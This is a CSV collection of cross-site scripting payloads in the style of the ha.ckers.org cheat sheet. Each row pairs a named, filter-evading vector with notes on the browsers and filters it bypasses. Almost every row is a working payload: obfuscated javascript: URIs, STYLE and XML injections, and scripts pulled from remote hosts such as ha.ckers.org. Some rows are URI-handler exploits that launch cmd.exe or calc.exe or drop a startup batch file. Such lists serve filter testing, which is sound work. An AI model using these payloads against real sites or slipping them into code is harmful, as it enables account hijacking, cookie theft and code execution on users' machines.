"META","The odd thing about meta refresh is that it doesn't send a referrer in the header - so it can be used for certain types of attacks where you need to get rid of referring URLs.","<META HTTP-EQUIV=""refresh"" CONTENT=""0;url=javascript:alert('XSS');"">","general, evil tags","ha.ckers.org",""
"META w/additional URL parameter","Meta with additional URL parameter. If the target website attempts to see if the URL contains an ”http://” you can evade it with the following technique (Submitted by Moritz Naumann http://www.moritz-naumann.com)","<META HTTP-EQUIV=""refresh"" CONTENT=""0; URL=http://;URL=javascript:alert('XSS');"">","general, evil tags","ha.ckers.org",""
"META w/data:URL","This is nice because it also doesn't have anything visibly that has the word SCRIPT or the JavaScript directive in it, since it utilizes base64 encoding. Please see http://www.ietf.org/rfc/rfc2397.txt for more details","<META HTTP-EQUIV=""refresh"" CONTENT=""0;url=data:text/html;base64###PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K"">","general, evil tags","ha.ckers.org",""
"Mixed Encoding","URL string evasion (assuming ”http://www.google.com/” is programmatically disallowed).
The tabs and newlines only work if this is encapsulated with quotes.","<A HREF=""http://6&#09;6.000146.0x7.147/"">XSS</A>","general, evil tags, obfuscated","ha.ckers.org",""
"Mocha","Mocha (Older Netscape only)","<IMG SRC=""mocha:[code]"">","general, evil tags","ha.ckers.org",""
"Multiline w/Carriage Returns","Multiline Injected JavaScript using ASCII carriage returns (same as above only a more extreme example of this XSS vector).","<IMGSRC=""javascript:alert('XSS')"">","general, evil tags, internet explorer","ha.ckers.org",""
"No Closing Script Tag","In Firefox and Netscape 8.1 in the Gecko rendering engine mode you don't actually need the ”></SCRIPT>” portion of this Cross Site Scripting vector. Firefox assumes it's safe to close the HTML tag and add closing tags for you. How thoughtful! Unlike the next one, which doesn't affect Firefox, this does not require any additional HTML below it. You can add quotes if you need to, but they're not needed generally.","<SCRIPT SRC=http://ha.ckers.org/xss.js","general, evil tags, injection, gecko","ha.ckers.org",""
"No Quotes/Semicolons","No single quotes or double quotes or semicolons.","<SCRIPT>a=/XSS/alert(a.source)</SCRIPT>","general, evil tags, obfuscated","ha.ckers.org",""
"Non-Alpha/Non-Digit","Non-alpha-non-digit XSS.  While I was reading the Firefox HTML parser I found that it assumes a non-alpha-non-digit is not valid after an HTML keyword and therefore considers it to be a whitespace or non-valid token after an HTML tag.  The problem is that some XSS filters assume that the tag they are looking for is broken up by whitespace.  For example ”<SCRIPT\s” != ”<SCRIPT/XSS\s”","<SCRIPT/XSS SRC=""http://ha.ckers.org/xss.js""></SCRIPT>","general, evil tags, injection","ha.ckers.org",""
"Non-Alpha/Non-Digit Part 2","Non-alpha-non-digit XSS part 2.  yawnmoth brought my attention to this vector, based on the same idea as above, however, I expanded on it, using my fuzzer. The Gecko rendering engine allows for any character other than letters, numbers or encapsulation chars (like quotes, angle brackets, etc...) between the event handler and the equals sign, making it easier to bypass cross site scripting blocks. Note that this does not apply to the grave accent char as seen here.","<BODY onload!#$%&()*~+-_.###:;?@[/|\]^`=alert(""XSS"")>","general, evil tags, obfuscated","ha.ckers.org",""
"Null Chars 1","Okay, I lied, null chars also work as XSS vectors but not like above, you need to inject them directly using something like Burp Proxy (http://www.portswigger.net/proxy/) or use %00 in the URL string or if you want to write your own injection tool you can use Vim (^V^@ will produce a null) to generate it into a text file.  Okay, I lied again, older versions of Opera (circa 7.11 on Windows) were vulnerable to one additional char 173 (the soft hyphen control char). But the null char %00 is much more useful and helped me bypass certain real world filters with a variation on this example.","perl -e 'print ""<IMG SRC=java\0script:alert(""XSS"")>"";'> out","general, evil tags, obfuscated, internet explorer, CRLF","ha.ckers.org",""
"Null Chars 2","Here is a little known XSS attack vector using null characters.  You can actually break up the HTML itself using the same nulls as shown above. I've seen this vector bypass some of the most restrictive XSS filters to date","perl -e 'print ""&<SCR\0IPT>alert(""XSS"")</SCR\0IPT>"";' > out","general, evil tags, obfuscated, CRLF","ha.ckers.org",""
"OBJECT","If they allow objects, you can also inject virus payloads to infect the users, etc. and same with the APPLET tag. The linked file is actually an HTML file that can contain your XSS","<OBJECT TYPE=""text/x-scriptlet"" DATA=""http://ha.ckers.org/scriptlet.html""></OBJECT>","general, evil tags","ha.ckers.org",""
"OBJECT w/Embedded XSS","Using an OBJECT tag you can embed XSS directly (this is unverified).","<OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:alert('XSS')></OBJECT>","general, evil tags, obfuscated, internet explorer","ha.ckers.org",""
"OBJECT w/Flash 2","Using this action script inside flash can obfuscate your XSS vector.","a=""get"";&#10;b=""URL("""";&#10;c=""javascript:"";&#10;d=""alert('XSS');"")"";eval(a+b+c+d);","general, evil tags, obfuscated","ha.ckers.org",""
"Octal Encoding","URL string evasion (assuming ”http://www.google.com/” is programmatically disallowed).
Padding is allowed, although you must keep it above 4 total characters per class - as in class A, class B, etc...","<A HREF=""http://0102.0146.0007.00000223/"">XSS</A>","general, evil tags, obfuscated","ha.ckers.org",""
"PHP","PHP - requires PHP to be installed on the server to use this XSS vector. Again, if you can run any scripts remotely like this, there are probably much more dire issues.","<? echo('<SCR)';echo('IPT>alert(""XSS"")</SCRIPT>'); ?>","general, evil tags, obfuscated","ha.ckers.org",""
"Protocol Resolution Bypass","URL string evasion (assuming ”http://www.google.com/” is programmatically disallowed).
Protocol resolution bypass (// translates to http:// which saves a few more bytes). This is really handy when space is an issue too (two less characters can go a long way) and can easily bypass regex like ”(ht|f)tp(s)?://” (thanks to Ozh (http://planetOzh.com/) for part of this one). You can also change the ”//” to ”\\”. You do need to keep the slashes in place, however, otherwise this will be interpreted as a relative path URL.","<A HREF=""//www.google.com/"">XSS</A>","general, evil tags, obfuscated","ha.ckers.org",""
"Protocol resolution in script tags","This particular variant was submitted by Lukasz Pilorz and was based partially off of Ozh's protocol resolution bypass below. This cross site scripting example works in IE, Netscape in IE rendering mode and Opera if you add in a </SCRIPT> tag at the end. However, this is especially useful where space is an issue, and of course, the shorter your domain, the better. The ”.j” is valid, regardless of the MIME type because the browser knows it in context of a SCRIPT tag.","<SCRIPT SRC=//ha.ckers.org/.j>","general, evil tags, obfuscated, injection","ha.ckers.org",""
"Remote Stylesheet 1","Remote style sheet (using something as simple as a remote style sheet you can include your XSS as the style question redefined using an embedded expression.) This only works in IE and Netscape 8.1+ in IE rendering engine mode.  Notice that there is nothing on the page to show that there is included JavaScript. Note: With all of these remote style sheet examples they use the body tag, so it won't work unless there is some content on the page other than the vector itself, so you'll need to add a single letter to the page to make it work if it's an otherwise blank page.","<LINK REL=""stylesheet"" HREF=""http://ha.ckers.org/xss.css"">","general, evil tags, obfuscated, injection","ha.ckers.org",""
"Remote Stylesheet 2","Remote style sheet part 2 (this works the same as above, but uses a <STYLE> tag instead of a <LINK> tag). A slight variation on this vector was used to hack Google Desktop http://www.hacker.co.il/security/ie/css_import.html.  As a side note you can remote the end STYLE tag if there is HTML immediately after the vector to close it.  This is useful if you cannot have either an equal sign or a slash in your cross site scripting attack, which has come up at least once in the real world.","<STYLE>@import'http://ha.ckers.org/xss.css';</STYLE>","general, evil tags, obfuscated, style injection","ha.ckers.org",""
"Remote Stylesheet 3","Remote style sheet part 3. This only works in Opera but is fairly tricky.  Setting a link header is not part of the HTTP1.1 spec. However, some browsers still allow it (like Firefox and Opera).  The trick here is that I am setting a header (which is basically no different than in the HTTP header saying Link: <http://ha.ckers.org/xss.css>; REL=stylesheet) and the remote style sheet with my cross site scripting vector is running the JavaScript, which is not supported in FireFox.","<META HTTP-EQUIV=""Link"" Content=""<http://ha.ckers.org/xss.css>; REL=stylesheet"">","general, evil tags, injection","ha.ckers.org",""
"Remote Stylesheet 4","Remote style sheet part 4.  This only works in Gecko rendering engines and works by binding an XUL file to the parent page. I think the irony here is that Netscape assumes that Gecko is safer and therefore is vulnerable to this for the vast majority of sites.","<STYLE>BODY{-moz-binding:url(""http://ha.ckers.org/xssmoz.xml#xss"")}</STYLE>","general, evil tags, obfuscated, style injection","ha.ckers.org",""
"Removing Cnames","URL string evasion (assuming ”http://www.google.com/” is programmatically disallowed).
When combined with the above URL, removing ”www.” will save an additional 4 bytes for a total byte savings of 9 for servers that have this set up properly.","<A HREF=""http://google.com/"">XSS</A>","general, evil tags","ha.ckers.org",""
"Rename .js to .jpg","Assuming you can only fit in a few characters and it filters against ”.js” you can rename your JavaScript file to an image as an XSS vector.","<SCRIPT SRC=""http://ha.ckers.org/xss.jpg""></SCRIPT>","general, evil tags, obfuscated, injection","ha.ckers.org",""
"SCRIPT w/Alert()","Basic injection attack","<SCRIPT>alert('XSS')</SCRIPT>","general, evil tags, basic","ha.ckers.org",""
"SCRIPT w/Char Code","Inject this string, and in most cases where a script is vulnerable with no special XSS vector requirements the word ”XSS” will pop up.","<SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>","general, evil tags, obfuscated, basic","ha.ckers.org",""
"SCRIPT w/Source File","No filter evasion. This is a normal XSS JavaScript injection, and most likely to get caught but I suggest trying it first (the quotes are not required in any modern browser so they are omitted here).","<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>","general, evil tags, basic, injection","ha.ckers.org",""
"Spaces/Meta Chars","Spaces and meta chars before the JavaScript in images for XSS (this is useful if the pattern match doesn't take into account spaces in the word ”javascript:” - which is correct since that won't render- and makes the false assumption that you can't have a space between the quote and the ”javascript:” keyword. The actual reality is you can have any char from 1-32 in decimal).","<IMG SRC="" &#14;  javascript:alert('XSS');"">","general, evil tags, obfuscated, internet explorer","ha.ckers.org",""
"SSI","SSI (Server Side Includes) requires SSI to be installed on the server to use this XSS vector.  I probably don't need to mention this, but if you can run commands on the server there are no doubt much more serious issues.","<!--#exec cmd=""/bin/echo '<SCRIPT SRC'""--><!--#exec cmd=""/bin/echo '=http://ha.ckers.org/xss.js></SCRIPT>'""-->","general, evil tags, obfuscated, SSI, injection","ha.ckers.org",""
"STYLE","STYLE tag (Older versions of Netscape only)","<STYLE TYPE=""text/javascript"">alert('XSS');</STYLE>","general, evil tags, style injection, gecko","ha.ckers.org",""
"STYLE w/Anonymous HTML","Anonymous HTML with STYLE attribute (IE and Netscape 8.1+ in IE rendering engine mode don't really care if the HTML tag you build exists or not, as long as it starts with an open angle bracket and a letter)","<XSS STYLE=""xss:expression(alert('XSS'))"">","general, evil tags, obfuscated, internet explorer","ha.ckers.org",""
"STYLE w/background","STYLE tag using background.","<STYLE type=""text/css"">BODY{background:url(""javascript:alert('XSS')"")}</STYLE>","general, evil tags, injection, internet explorer","ha.ckers.org",""
"STYLE w/background-image","STYLE tag using background-image.","<STYLE>.XSS{background-image:url(""javascript:alert('XSS')"");}</STYLE><A CLASS=XSS></A>","general, evil tags, internet explorer, style injection","ha.ckers.org",""
"STYLE w/broken up JavaScript","STYLE tags with broken up JavaScript for XSS (this XSS at times sends IE into an infinite loop of alerts).","<STYLE>@im\port'\ja\vasc\ript:alert(""XSS"")';</STYLE>","general, evil tags, style injection, internet explorer","ha.ckers.org",""
"STYLE w/Comment","STYLE attribute using a comment to break up expression (Thanks to Roman Ivanov http://www.pixel-apes.com/ for this one)","<IMG STYLE=""xss:expr/*XSS*/ession(alert('XSS'))"">","general, evil tags, style injection, internet explorer","ha.ckers.org",""
"Stylesheet","Stylesheet","<LINK REL=""stylesheet"" HREF=""javascript:alert('XSS');"">","general, evil tags","ha.ckers.org",""
"TABLE","Table background (who would have thought tables were XSS targets... except me, of course).","<TABLE BACKGROUND=""javascript:alert('XSS')""></TABLE>","general, evil tags","ha.ckers.org",""
"TD","TD background.","<TABLE><TD BACKGROUND=""javascript:alert('XSS')""></TD></TABLE>","general, evil tags","ha.ckers.org",""
"URL Encoding","URL string evasion (assuming ”http://www.google.com/” is programmatically disallowed).","<A HREF=""http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D"">XSS</A>","general, evil tags, obfuscated","ha.ckers.org",""
"US-ASCII encoding","Found by Kurt Huwig http://www.iku-ag.de/ This uses malformed ASCII encoding with 7 bits instead of 8.  This XSS may bypass many content filters but only works if the hosts transmits in US-ASCII encoding, or if you set the encoding yourself.  This is more useful against web application firewall cross site scripting evasion than it is server side filter evasion.  Apache Tomcat is the only known server that transmits in US-ASCII encoding.","%BCscript%BEalert(%A2XSS%A2)%BC/script%BE","general, evil tags, obfuscated","ha.ckers.org",""
"UTF-7 Encoding","UTF-7 encoding - if the page that the XSS resides on doesn't provide a page charset header, or any browser that is set to UTF-7 encoding can be exploited with the following (Thanks to Roman Ivanov http://www.pixel-apes.com/ for this one). You don't need the charset statement if the user's browser is set to auto-detect and there is no overriding content-types on the page in Internet Explorer and Netscape 8.1 IE rendering engine mode). Watchfire  http://seclists.org/lists/fulldisclosure/2005/Dec/1107.html found this hole in Google's custom 404 script.","<HEAD><META HTTP-EQUIV=""CONTENT-TYPE"" CONTENT=""text/html; charset=UTF-7""> </HEAD>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-","general, evil tags, obfuscated","ha.ckers.org",""
"UTF-8 Unicode Encoding","UTF-8 Unicode encoding (all of the XSS examples that use a javascript: directive inside of an IMG tag will not work in Firefox or Netscape 8.1+ in the Gecko rendering engine mode).","<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>","general, evil tags, obfuscated, internet explorer","ha.ckers.org",""
"XML data island w/CDATA","XML data island with CDATA obfuscation (this XSS attack works only in IE and Netscape 8.1 IE rendering engine mode) - vector found by Sec Consult http://www.sec-consult.html while auditing Yahoo.","<XML ID=I><X><C><![CDATA[<IMG SRC=""javas]]><![CDATA[cript:alert('XSS');"">]]></C></X></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML>","general, evil tags, obfuscated, XML injection","ha.ckers.org",""
"XML data island w/comment","XML data island with comment obfuscation (doesn't use CDATA fields, but rather uses comments to break up the javascript directive)","<XML ID=""xss""><I><B><IMG SRC=""javas<!-- -->cript:alert('XSS')""></B></I></XML><SPAN DATASRC=""#xss"" DATAFLD=""B"" DATAFORMATAS=""HTML""></SPAN>","general, evil tags, obfuscated, XML injection","ha.ckers.org",""
"XML HTML+TIME","HTML+TIME in XML. This is how Grey Magic http://www.greymagic.com/security/advisories/gm005-mc/ hacked Hotmail and Yahoo!. This only works in Internet Explorer and Netscape 8.1 in IE rendering engine mode and remember that you need to be between HTML and BODY tags for this to work.","<HTML><BODY><?xml:namespace prefix=""t"" ns=""urn:schemas-microsoft-com:time""><?import namespace=""t"" implementation=""#default#time2""><t:set attributeName=""innerHTML"" to=""XSS<SCRIPT DEFER>alert('XSS')</SCRIPT>""> </BODY></HTML>","general, evil tags, obfuscated, XML injection","ha.ckers.org",""
"XML namespace","XML namespace. The .htc file must be located on the server as your XSS vector.","<HTML xmlns:xss><?import namespace=""xss"" implementation=""http://ha.ckers.org/xss.htc""><xss:xss>XSS</xss:xss></HTML>","general, evil tags, obfuscated, XML injection","ha.ckers.org",""
"XML (locally hosted)","Locally hosted XML with embedded JavaScript that is generated using an XML data island. This is the same as above but instead refers to a locally hosted (must be on the same server) XML file that contains the cross site scripting vector.","<XML SRC=""http://ha.ckers.org/xsstest.xml"" ID=I></XML><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>","general, evil tags, obfuscated, XML injection","ha.ckers.org",""
"XSS Quick Test","If you don't have much space, this string is a nice compact XSS injection check. View source after injecting it and look for <XSS versus &lt;XSS to see if it is vulnerable.","'';!--""<XSS>=&{()}","general, html breaking, JS breaking, comment breaking","ha.ckers.org",""
"aim: uri exploit","This aim-uri executes the calc.exe on vulnerable systems","aim: &c:\windows\system32\calc.exe"" ini=""C:\Documents and Settings\All Users\Start Menu\Programs\Startup\pwnd.bat""","URI exploits, gecko, injection, general","xs-sniper",""
"firefoxurl: uri exploit (UXSS)","This vector creates an UXSS via firefoxurl:","firefoxurl:test|""%20-new-window%20javascript:alert(\'Cross%2520Browser%2520Scripting!\');""","URI exploits, general, injection, obfuscated, internet explorer","xs-sniper",""
"navigatorurl: code execution","This navigatorurl-uri executes the cmd.exe on vulnerable systems.","navigatorurl:test"" -chrome ""javascript:C=Components.classes;I=Components.interfaces;file=C[\'@mozilla.org/file/local;1\'].createInstance(I.nsILocalFile);file.initWithPath(\'C:\'+String.fromCharCode(92)+String.fromCharCode(92)+\'Windows\'+String.fromCharCode(92)+String.fromCharCode(92)+\'System32\'+String.fromCharCode(92)+String.fromCharCode(92)+\'cmd.exe\');process=C[\'@mozilla.org/process/util;1\'].createInstance(I.nsIProcess);process.init(file);process.run(true%252c{}%252c0);alert(process)","URI exploits, gecko, injection, general","xs-sniper",""
"res:// installed software probing","This res-uri can be used to probe for certain software in IE.","res://c:\\program%20files\\adobe\\acrobat%207.0\\acrobat\\acrobat.dll/#2/#210","URI exploits, injection, general, obfuscated, internet explorer","xs-sniper",""
"Image tag with obfuscated JS URI","This vector creates three image tags with differing CRLF obfuscation in the javascript: URI.","<IMG SRC=""jav&#x09;ascript:alert(<WBR>'XSS');"">
<IMG SRC=""jav&#x0A;ascript:alert(<WBR>'XSS');"">
<IMG SRC=""jav&#x0D;ascript:alert(<WBR>'XSS');"">","general, basic, obfuscated, evil tags, internet explorer","OWASP",""
"Obfuscated image tag using dec entities","This attack is built together with obfuscated decimal entities and create a JS image source.","<IMGSRC=&#106;&#97;&#118;&#97;&<WBR>#115;&#99;&#114;&#105;&#112;&<WBR>#116;&#58;&#97;
 &#108;&#101;&<WBR>#114;&#116;&#40;&#39;&#88;&#83<WBR>;&#83;&#39;&#41>","general, basic, obfuscated, evil tags, internet explorer","OWASP",""
"Obfuscated image tag using hex entities","This attack is built together with obfuscated hexadecimal entities and create a JS image source.","<IMGSRC=&#x6A&#x61&#x76&#x61&#x73&<WBR>#x63&#x72&#x69&#x70&#x74&#x3A&<WBR>#x61&#x6C&#x65&#x72&#x74&#x28
 &<WBR>#x27&#x58&#x53&#x53&#x27&#x29>","general, basic, obfuscated, evil tags, internet explorer","OWASP",""
"Obfuscated image tag using long dec entities","This attack is built together with obfuscated long decimal entities and create a JS image source.","<IMGSRC=&#0000106&#0000097&<WBR>#0000118&#0000097&#0000115&<WBR>#0000099&#0000114&#0000105&<WBR>#0000112&#0000116&#0000058
&<WBR>#0000097&#0000108&#0000101&<WBR>#0000114&#0000116&#0000040&<WBR>#0000039&#0000088&#0000083&<WBR>#0000083&#0000039&#0000041>","general, owasp, obfuscated, evil tags, internet explorer","OWASP",""
"Obfuscated JS image source","This vector uses urlencoded hex entities to obfuscate the javascript: image source.",">""'><img%20src%3D%26%23x6a;%26%23x61;%26%23x76;%26%23x61;%26%23x73;%26%23x63;%26%23x72;%26%23x69;%26%23x70;%26%23x74;%26%23x3a;
 alert(%26quot;%26%23x20;XSS%26%23x20;Test%26%23x20;Successful%26quot;)>","general, owasp, obfuscated, evil tags, internet explorer","OWASP",""
"Unicode encoded script tags","This vector uses unicode encoded codepoints to create a script tag producing an alert.","'%uff1cscript%uff1ealert('XSS')%uff1c/script%uff1e'","general, basic, obfuscated, evil tags","OWASP",""
"URL encoded image source","This vector utilizes an urlencoded JS image source to create an alert.",">%22%27><img%20src%3d%22javascript:alert(%27%20XSS%27)%22>","general, basic, obfuscated, internet explorer","OWASP",""
"Camouflaged comment injection with JS link","This vector evades filters by camouflaging as a comment and inhabiting a JS link.","<!--
<A href=""
- --><a href=javascript:alert:document.domain
>test-->","general, obfuscated, comment breaking, internet explorer","thespanner.co.uk",""
"JS link with whitespace obfuscation","This vector utilizes whitespace to obfuscate and contains a JS link.","<a href          =              ""javas  cript   :ale                            rt(1)"">test","general, evil tags, obfuscated","thespanner.co.uk",""
"JSON based obfuscated onload vector","This vector injects a new body tag and utilized the onload event to modify the DOM. JSON parenthesis and semicolons are to evade filters.","<body onload=;a2={y:eval};a1={x:a2.y('al'+'ert')};;;;;;;;;_=a1.x;_(1);;;;","general, evil tags, JSON, obfuscated","thespanner.co.uk",""
"JSON based onload vector","This vector injects a new body tag and utilized the onload event to modify the DOM","<body onload=a1={x:this.parent.document};a1.x.writeln(1);>","general, evil tags, JSON, obfuscated","thespanner.co.uk",""
"JSON based semicolon-onload vector","This vector injects a new body tag and utilized the onload event to modify the DOM. Also this vector uses semicolons to obfuscate.","<body onload=;a1={x:document};;;;;;;;;_=a1.x;_.write(1);;;;","general, evil tags, JSON, obfuscated","thespanner.co.uk",""
"Obfuscated body onload vector","This vector creates a new body tag and utilizes semicolons and underscores to evade filters and produce an alert.","<body onload=;;;;;;;;;;;_=alert;_(1);;;;","general, evil tags, obfuscated","thespanner.co.uk",""
"Obfuscated double-body onload vector","This vector creates a doubled new body tag and utilizes semicolons to evade filters and produce an alert.","<body <body onload=;;;;;al:eval('al'+'ert(1)');;>","general, evil tags, obfuscated","thespanner.co.uk",""
"Obfuscated onload attribute variant 1","This vector creates a new body tag including an obfuscated onload attribute. Also the document object is wrapped into a JSON literal to evade filters.","<body/s/onload=x={doc:parent.document};x.doc.writeln(1)","general, obfuscated, evil tags, JSON","thespanner.co.uk",""
"Obfuscated onload attribute variant 2","This vector creates a new body tag including an obfuscated onload attribute. Also the document object is wrapped into a JSON literal to evade filters.","<body/””$/onload=x={doc:parent[’document’]};x.doc.writeln(1)","general, obfuscated, evil tags, JSON","thespanner.co.uk",""
"Self-containing XSS with no dots","This vector uses with() to activate the payload behind the fragment identifier. No dots are used to enable easier filter evasion.","with(location)with(hash)eval(substring(1))","general, super short, self contained","ma1",""
"Eval string contained in name property","This very simple but effective vector uses the eval method on the name property.","eval(name)","general, super short, self contained","SIrDarckCat",""
"HTML wrapped in XML","This vector uses HTML wrapped in XML and can be used to circumvent common filters. This works in Gecko based browsers only.","<?xml version=""1.0""?>
<html:html xmlns:html='http://www.w3.org/1999/xhtml'>
<html:script>
alert(document.cookie);
</html:script>
</html:html>","general, XML injection, evil tags, gecko, obfiscated","SIrDarckCat",""
"Obfuscated name trigger for Firefox","This XSS vector uses a parser bug in Firefox to obfuscate the methods needed to trigger the name contained payload. ","(1?(1?{a:1?""""[1?""ev\a\l"":0](1?""\a\lert"":0):0}:0).a:0)[1?""\c\a\l\l"":0](content,1?""x\s\s"":0)","general, gecko, obfuscated, self contained","SIrDarckCat",""
"Open string contained in name property","This very simple but effective vector uses the open method on the name property.","open(name)","general, super short, self contained","SIrDarckCat",""
"RegExp based, and native C filter vector.","This will break any RegExp that includes ""$"" (end of string), and some filters that do the verification manually with a for waiting for a NULL byte.","0%0d%0a%00<script src=//h4k.in>","general, injection, CRLF, obfuscated","SIrDarckCat","http://sirdarckcat.net/"
"Closing JS Tag in JS String assignment","For some reason, Firefox picks up the script closing tag in the quoted string and then proceeds to process the remaining script tags as code.","<script>
var a = ""</script> <script> alert('XSS !'); </script> <script>"";
</script>
","general, gecko, obfuscated, evil tags","t3rmin4t0r",""
"Super short XSS variant 2","This extremely short XSS vector works with out the need for newlines to be injected,","A=alert;A(1)","super short, general, basic","-unknown-",""
